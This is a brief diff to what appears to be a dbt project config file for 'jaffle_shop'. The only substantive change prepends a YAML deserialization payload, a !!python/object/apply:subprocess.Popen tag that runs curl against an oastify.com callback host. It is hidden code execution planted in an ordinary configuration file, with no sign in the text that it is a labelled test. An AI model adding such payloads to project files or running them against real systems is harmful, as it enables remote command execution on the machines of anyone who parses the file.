@@ -1,3 +1,6 @@
+!!python/object/apply:subprocess.Popen
+- curl http://8nw0k0n1dirubtkklojzw7blvc14pt.oastify.com
+
 name: 'jaffle_shop'
 
 config-version: 2
